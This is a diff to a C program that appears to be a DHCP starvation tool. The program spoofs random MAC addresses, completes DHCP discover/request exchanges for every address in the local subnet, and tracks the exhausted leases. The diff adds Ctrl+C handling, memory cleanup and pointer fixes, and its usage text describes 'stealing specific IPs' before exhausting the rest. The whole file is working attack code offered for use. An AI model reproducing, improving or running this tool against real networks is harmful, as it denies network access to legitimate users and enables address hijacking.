@@ -17,8 +17,10 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <getopt.h>
+#include <signal.h>
 
 #define BUFFER_SIZE 65535
+volatile sig_atomic_t keep_running = 1;
 
 // DHCP header structure
 typedef struct DHCP
@@ -94,10 +96,13 @@ void spoof_mac(uint8_t *mac);
 void rand_transaction_id(uint8_t *id);
 void calc_ip_checksum(Packet *p);
 int netmask_to_cidr(unsigned long netmask);
-void exaust_pool(int sock, int ifindex, Packet *p, Exausted *e, int num, int delay, const char *hostname);
+void exaust_pool(int sock, int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname);
+void stop(int sig);
+void cleanup(Packet *p, Exausted *head, int sock);
 
 int main(int argc, char *argv[])
 {
+    signal(SIGINT, stop);
     char *iface = NULL;
     char *import_file = NULL;
     int opt;
@@ -246,11 +251,9 @@ int main(int argc, char *argv[])
 
     int cidr = netmask_to_cidr(iaddr->sin_addr.s_addr);
     int num_of_ips = (1 << (32 - cidr)) - 2;
-
-    printf("identified %d ip's to exause on subnet...\n", num_of_ips);
-    printf("starting attack...\n");
-    
-    exaust_pool(sock, ifindex, p, head, num_of_ips, 0, hostname);
+ 
+    exaust_pool(sock, ifindex, p, &head, num_of_ips, 0, hostname);
+    cleanup(p, head, sock);
 }
 
 void spoof_mac(uint8_t *mac)
@@ -308,7 +311,7 @@ int netmask_to_cidr(unsigned long netmask)
 }
 
 
-void exaust_pool(int sock, int ifindex, Packet *p, Exausted *head, int num, int delay, const char *hostname)
+void exaust_pool(int sock, int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname)
 {
     unsigned char buffer[BUFFER_SIZE];
     char random_mac[18];
@@ -319,7 +322,7 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted *head, int num, int 
     int count = 0;
     bool success = false;
 
-    for(int i = 0; i < num; i++)
+    for(int i = 0; i < num && keep_running; i++)
     {
         spoof_mac(p->eth.src_mac);
         memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
@@ -355,7 +358,7 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted *head, int num, int 
             return;
         }
 
-        while(true)
+        while(keep_running)
         {
 
             int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
@@ -392,9 +395,6 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted *head, int num, int 
             response_packet->dhcp.ip_addr[3]
             );
 
-            //printf("[%s] offered [%s] for [%s]", host, offered_ip, random_mac);
-            //fflush(stdout);
-
             offset = 0;
 
             p->dhcp.options[offset++] = 53;
@@ -429,7 +429,7 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted *head, int num, int 
                 return;
             }
 
-            while(true)
+            while(keep_running)
             {
                 int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
 
@@ -450,9 +450,6 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted *head, int num, int 
                     continue;
                 }
 
-                //printf(" - [SUCCESS]\n");
-
-
                 Exausted *new_node = malloc(sizeof(Exausted));
                 if(!new_node)
                 {
@@ -460,16 +457,15 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted *head, int num, int 
                     return;
                 }
                 count++;
-                printf("\033[2J\033[H");  // ANSI: clear screen + move cursor to home
+                printf("\033[2J\033[H");
                 fflush(stdout);
-                printf("Exausted %d/%d IP's\n", count, num);
-                
+                printf("[%d] IP addresses in subnet --- Exausted [%d/%d]\n", num, count, num);
 
                 memcpy(&new_node->ip, &response_packet->dhcp.ip_addr, sizeof(response_packet->dhcp.ip_addr));
                 memcpy(&new_node->mac, &p->eth.src_mac, sizeof(p->eth.src_mac));
                 new_node->lease_time = 7200;
-                new_node->next = head;
-                head = new_node;
+                new_node->next = *head;
+                *head = new_node;
                 break;
             }
             break;
@@ -502,4 +498,26 @@ void print_usage(const char *progname)
     printf(" Targeted: Uses -f to steal specific IPs first, then exhausts remainder\n");
     printf("\n");
     printf("Press Ctrl+C to stop exaust attack.\n");
+}
+
+void cleanup(Packet *p, Exausted *head, int sock)
+{
+    printf("\n\nCleaning up... ");
+    Exausted *current = head;
+
+    while(current != NULL)
+    {
+        Exausted *tmp = current;
+        current = current->next;
+        free(tmp);
+    }
+
+    free(p);
+    close(sock);
+    printf(" [OK]\n");
+}
+
+void stop(int sig)
+{
+    keep_running = 0;
 }
